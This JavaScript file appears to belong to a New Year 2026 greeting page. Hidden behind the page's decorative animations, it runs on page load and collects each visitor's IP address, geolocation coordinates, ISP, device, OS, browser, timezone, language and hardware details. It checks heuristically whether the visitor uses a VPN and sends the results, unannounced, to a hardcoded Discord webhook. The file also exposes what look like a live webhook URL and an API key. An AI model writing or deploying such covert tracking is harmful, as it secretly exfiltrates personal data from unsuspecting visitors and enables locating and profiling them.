// ╔════════════════════════════════════════════════════════════════════════════╗
// ║           2026 DATA COLLECTION - DUAL VPN DETECTION METHODS                ║
// ╚════════════════════════════════════════════════════════════════════════════╝

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1432202259005051001/90bxiwZLU2Y_eVmCguLrIDcb1R6rlfzEK2XAnzbx8GpEP-HJXaAtnzqqbH5hJb1OJwMH";
const IPIFY_API_KEY = "at_fvVzo9h2GyZ55eflsA6LgNZGOyH98";

// Timezone mapping reference for common timezone-country combinations
const COMMON_TIMEZONE_COUNTRIES = {
  "America/New_York": ["US", "CA"],
  "America/Chicago": ["US", "CA", "MX"],
  "America/Denver": ["US", "CA", "MX"],
  "America/Los_Angeles": ["US", "CA", "MX"],
  "Europe/London": ["GB", "IE", "PT"],
  "Europe/Paris": ["FR", "DE", "ES", "IT", "NL", "BE"],
  "Europe/Berlin": ["DE", "AT", "CH", "NL", "BE"],
  "Asia/Tokyo": ["JP"],
  "Asia/Shanghai": ["CN"],
  "Asia/Kolkata": ["IN"],
  "Australia/Sydney": ["AU"]
};

// ---- CORE DATA FUNCTIONS ----
async function getIPAndGeo() {
  try {
    console.log("Fetching IP address...");
    const ipRes = await fetch('https://api.ipify.org?format=json');
    if (!ipRes.ok) throw new Error(`IP fetch failed: ${ipRes.status}`);
    
    const { ip } = await ipRes.json();
    console.log("IP Address found:", ip);
    
    console.log("Fetching geolocation from ipify...");
    const geoUrl = `https://geo.ipify.org/api/v2/country,city?apiKey=${IPIFY_API_KEY}&ipAddress=${ip}`;
    const geoRes = await fetch(geoUrl);
    
    if (!geoRes.ok) {
      const errorText = await geoRes.text();
      throw new Error(`IPify API error ${geoRes.status}: ${errorText}`);
    }
    
    const geoData = await geoRes.json();
    console.log("Geolocation data received:", geoData);
    
    return { ip, geoData };
  } catch (error) {
    console.error("Geolocation failed:", error);
    return null;
  }
}

// ---- DUAL VPN DETECTION METHODS ----

// METHOD 2: Heuristic Analysis (ISP/Hosting Detection)
function checkHostingIP(geoData) {
  const asName = geoData?.as?.name || '';
  const isp = geoData?.isp || '';
  const orgString = (asName + isp).toLowerCase();
  
  console.log("ISP/AS Info:", { asName, isp });
  
  // Comprehensive list of hosting/datacenter providers
  const hostingProviders = [
    'amazon', 'aws', 'google', 'gcp', 'microsoft', 'azure',
    'digitalocean', 'linode', 'vultr', 'ovh', 'hetzner',
    'cloudflare', 'akamai', 'fastly', 'leaseweb', 'alibaba',
    'oracle cloud', 'ibm cloud', 'rackspace', 'choopa', 'psychz',
    'serverion', 'crowncloud', 'private layer', 'm247', 'colo',
    'data center', 'hosting', 'cloud', 'server', 'vps'
  ];
  
  const isHosting = hostingProviders.some(provider => orgString.includes(provider));
  console.log("Hosting IP check result:", isHosting);
  
  return isHosting;
}

// METHOD 3: Multi-Source Data Cross-Check
function checkLocationMismatch(geoData, clientCountryCode) {
  if (!clientCountryCode || !geoData?.location?.country) {
    console.log("Missing data for location mismatch check");
    return null;
  }
  
  const ipCountry = geoData.location.country; // 2-letter country code from IP
  console.log("Location check - IP Country:", ipCountry, "Browser Country:", clientCountryCode);
  
  // 1. Direct country code mismatch (strongest signal)
  if (clientCountryCode !== ipCountry) {
    const mismatch = `Country mismatch: IP=${ipCountry}, Browser=${clientCountryCode}`;
    console.log("Country mismatch detected:", mismatch);
    return mismatch;
  }
  
  // 2. Timezone-country consistency check
  const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  console.log("Browser Timezone:", browserTimezone);
  
  if (browserTimezone && COMMON_TIMEZONE_COUNTRIES[browserTimezone]) {
    const typicalCountries = COMMON_TIMEZONE_COUNTRIES[browserTimezone];
    if (!typicalCountries.includes(ipCountry)) {
      const mismatch = `Timezone atypical: ${browserTimezone} in ${ipCountry}`;
      console.log("Timezone mismatch detected:", mismatch);
      return mismatch;
    }
  }
  
  // 3. Language-country consistency check
  const browserLang = navigator.language.substring(0, 2).toUpperCase();
  console.log("Browser Language:", browserLang);
  
  const commonLangMap = {
    'US': 'EN', 'GB': 'EN', 'DE': 'DE', 'FR': 'FR', 
    'ES': 'ES', 'IT': 'IT', 'JP': 'JA', 'CN': 'ZH',
    'RU': 'RU', 'KR': 'KO', 'BR': 'PT', 'PT': 'PT',
    'NL': 'NL', 'SE': 'SV', 'NO': 'NO', 'DK': 'DA'
  };
  
  if (commonLangMap[ipCountry] && browserLang !== commonLangMap[ipCountry]) {
    const mismatch = `Language atypical: ${browserLang} for ${ipCountry}`;
    console.log("Language mismatch detected:", mismatch);
    return mismatch;
  }
  
  console.log("No location mismatches detected");
  return null; // No mismatch detected
}

// ---- COMBINED VPN ASSESSMENT ----
async function assessVpnRisk(ip, geoData) {
  const results = {
    finalVerdict: "NO",
    confidence: "low",
    details: [],
    warnings: []
  };
  
  // Get client's browser-detected country
  let clientCountryCode = null;
  try {
    const locale = Intl.DateTimeFormat().resolvedOptions().locale;
    clientCountryCode = locale.split('-')[1]?.toUpperCase();
    console.log("Client country code from locale:", clientCountryCode);
  } catch(e) { 
    console.log("Could not get client country from locale");
  }
  
  // METHOD 2: Heuristic ISP Analysis
  const isHostingIP = checkHostingIP(geoData);
  if (isHostingIP) {
    results.details.push("IP belongs to hosting/datacenter provider");
    results.finalVerdict = "SUSPECT";
    results.confidence = "medium";
    results.warnings.push("Hosting IP detected - common for VPNs/proxies");
  }
  
  // METHOD 3: Cross-Check Analysis
  const mismatch = checkLocationMismatch(geoData, clientCountryCode);
  if (mismatch) {
    results.details.push(mismatch);
    results.finalVerdict = "SUSPECT";
    results.confidence = mismatch.includes("Country mismatch") ? "high" : "medium";
    results.warnings.push("Location inconsistency detected");
  }
  
  // Residential ISP counter-check
  const orgString = (geoData?.as?.name + geoData?.isp).toLowerCase();
  const residentialIsps = [
    'comcast', 'spectrum', 'verizon', 'att', 'bell', 'rogers',
    'bt', 'vodafone', 'telecom', 't-mobile', 'orange', 'telefonica',
    'deutsche telekom', 'sky', 'virgin media', 'cox', 'centurylink',
    'frontier', 'optus', 'telstra', 'shaw', 'telus', 'kpn'
  ];
  
  const isResidential = residentialIsps.some(isp => orgString.includes(isp));
  console.log("Residential ISP check:", isResidential);
  
  if (isResidential) {
    results.details.push("Residential ISP detected");
    if (results.finalVerdict === "SUSPECT") {
      results.details.push("Residential ISP reduces suspicion");
      results.confidence = "low";
    } else {
      results.finalVerdict = "NO";
      results.confidence = "high";
    }
  }
  
  // Additional checks
  if (!geoData.location.city || geoData.location.city === "") {
    results.details.push("City information missing");
    results.warnings.push("Incomplete location data");
  }
  
  // Format final output
  let output = `${results.finalVerdict}`;
  if (results.details.length > 0) {
    output += ` (${results.details.join('; ')})`;
  }
  if (results.confidence !== "low") {
    output += ` [${results.confidence} confidence]`;
  }
  
  if (results.warnings.length > 0) {
    output += ` Warnings: ${results.warnings.join(', ')}`;
  }
  
  console.log("Final VPN assessment:", output);
  return output;
}

// ---- CLIENT INFO DETECTION ----
function detectDeviceType() {
  const ua = navigator.userAgent;
  if (/mobile|android|iphone|ipad|ipod/i.test(ua)) {
    return screen.width < 768 ? "📱 Mobile Phone" : "📱 Tablet";
  }
  return "💻 Desktop/Laptop";
}

function detectOS() {
  const ua = navigator.userAgent;
  if (/Windows NT 10.0/.test(ua)) return "Windows 10/11";
  if (/Windows NT/.test(ua)) return "Windows";
  if (/Macintosh/.test(ua)) return "macOS";
  if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
  if (/Android/.test(ua)) return "Android";
  if (/Linux/.test(ua)) return "Linux";
  if (/CrOS/.test(ua)) return "Chrome OS";
  return navigator.platform || "Unknown OS";
}

function detectBrowser() {
  const ua = navigator.userAgent;
  if (/Edg\//.test(ua)) return "Microsoft Edge";
  if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) return "Google Chrome";
  if (/Firefox\//.test(ua)) return "Mozilla Firefox";
  if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) return "Apple Safari";
  if (/OPR\//.test(ua) || /Opera/.test(ua)) return "Opera";
  if (/MSIE|Trident/.test(ua)) return "Internet Explorer";
  if (/Brave/.test(ua)) return "Brave";
  return "Unknown Browser";
}

// ---- MAIN DATA COLLECTION ----
async function collectAndSendData() {
  try {
    console.log("Starting dual-method data collection...");
    
    // Get IP and geolocation
    const ipGeo = await getIPAndGeo();
    if (!ipGeo) {
      throw new Error("Failed to get IP or geolocation. Check console for details.");
    }
    
    const { ip, geoData } = ipGeo;
    
    // Detect client info
    const deviceType = detectDeviceType();
    const osType = detectOS();
    const browserType = detectBrowser();
    
    // Get browser timezone and language
    const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const browserLanguages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
    
    // Perform dual VPN assessment
    console.log("Starting VPN assessment...");
    const vpnAssessment = await assessVpnRisk(ip, geoData);
    
    // Prepare payload for Discord
    const payload = {
      "🌐 **IP Address**": `\`${ip}\``,
      "📍 **IP Location**": `\`${geoData.location.city || 'Unknown'}, ${geoData.location.region || 'Unknown'}, ${geoData.location.country || 'Unknown'}\``,
      "🗺️ **Coordinates**": `\`${geoData.location.lat || 'N/A'}, ${geoData.location.lng || 'N/A'}\``,
      "🏢 **ISP / Network**": `\`${geoData.isp || 'Unknown'} (AS${geoData.as?.asn || 'N/A'})\``,
      "📱 **Device Type**": `\`${deviceType}\``,
      "💻 **Operating System**": `\`${osType}\``,
      "🌍 **Browser**": `\`${browserType}\``,
      "🕒 **Browser Timezone**": `\`${browserTimezone}\``,
      "🗣️ **Browser Languages**": `\`${browserLanguages}\``,
      "⚠️ **VPN Assessment**": `\`${vpnAssessment}\``,
      "🔍 **Detection Methods**": "`Heuristic ISP + Location Cross-Check`",
      "🖥️ **Screen Resolution**": `\`${screen.width}×${screen.height}\``,
      "🎨 **Color Depth**": `\`${screen.colorDepth} bit\``,
      "⏰ **IP Timezone**": `\`${geoData.location.timezone || 'Unknown'}\``,
      "⏱️ **Visit Time (UTC)**": `\`${new Date().toISOString()}\``,
      "👤 **User Agent Short**": `\`${navigator.userAgent.substring(0, 100)}${navigator.userAgent.length > 100 ? '...' : ''}\``,
      "🔧 **Hardware Cores**": `\`${navigator.hardwareConcurrency || 'Unknown'}\``,
      "💾 **Device Memory**": `\`${navigator.deviceMemory || 'Unknown'} GB\``
    };
    
    // Send to Discord
    await sendToDiscord(payload, ip);
    console.log("✅ Data sent successfully with dual VPN detection.");
    
  } catch (error) {
    console.error("❌ Collection error:", error);
    await sendErrorToDiscord(error.message);
  }
}

// ---- DISCORD INTEGRATION ----
async function sendToDiscord(data, ip) {
  try {
    console.log("Sending data to Discord...");
    
    const fields = Object.entries(data).map(([name, value]) => ({
      name: name,
      value: value,
      inline: false
    }));
    
    const embed = {
      username: "New Year 2026 Tracker",
      avatar_url: "https://cdn-icons-png.flaticon.com/512/3114/3114819.png",
      embeds: [{
        title: "🎉 Dual-Method VPN Detection Report 🎉",
        color: 0xFFD700,
        description: `**Comprehensive analysis for IP:** \`${ip}\`\n*Combining heuristic ISP checks + location cross-verification*`,
        fields: fields,
        timestamp: new Date().toISOString(),
        footer: {
          text: "IPify API + Dual Detection Logic • Credits Used: 2 per request",
        },
        thumbnail: {
          url: "https://cdn-icons-png.flaticon.com/512/3114/3114819.png"
        }
      }],
      content: `<@&1432202036723847221> New visitor data with enhanced VPN analysis.`
    };
    
    console.log("Discord payload prepared, sending...");
    const response = await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(embed)
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Discord API error ${response.status}: ${errorText}`);
    }
    
    console.log("✅ Successfully sent to Discord!");
    
  } catch (error) {
    console.error("Failed to send to Discord:", error);
    throw error; // Re-throw to be caught by caller
  }
}

async function sendErrorToDiscord(errorMsg) {
  try {
    const embed = {
      embeds: [{
        title: "❌ Data Collection Error",
        description: `\`\`\`${errorMsg.substring(0, 1000)}\`\`\``,
        color: 0xFF0000,
        timestamp: new Date().toISOString(),
        footer: {
          text: "New Year 2026 Tracker Error"
        }
      }]
    };
    await fetch(DISCORD_WEBHOOK, { 
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' }, 
      body: JSON.stringify(embed) 
    });
  } catch (e) { 
    console.error("Couldn't send error log to Discord:", e);
  }
}

// ---- INITIALIZE ----
document.addEventListener('DOMContentLoaded', () => {
  console.log("Page loaded. Starting data collection in 1.5 seconds...");
  
  // Small delay to ensure page renders first
  setTimeout(() => {
    collectAndSendData().catch(error => {
      console.error("Unhandled error in data collection:", error);
    });
  }, 1500);
});

// Add some interactivity
document.addEventListener('DOMContentLoaded', () => {
  // Make the year number interactive
  const yearNumber = document.querySelector('.year-number');
  if (yearNumber) {
    yearNumber.addEventListener('click', () => {
      yearNumber.style.transform = 'scale(1.1)';
      yearNumber.style.transition = 'transform 0.3s ease';
      setTimeout(() => {
        yearNumber.style.transform = 'scale(1)';
      }, 300);
    });
  }
  
  // Add animation to wishes section
  const wishesSection = document.querySelector('.wishes-section');
  if (wishesSection) {
    wishesSection.addEventListener('mouseenter', () => {
      wishesSection.style.transform = 'translateY(-5px)';
      wishesSection.style.transition = 'transform 0.3s ease';
    });
    
    wishesSection.addEventListener('mouseleave', () => {
      wishesSection.style.transform = 'translateY(0)';
    });
  }
});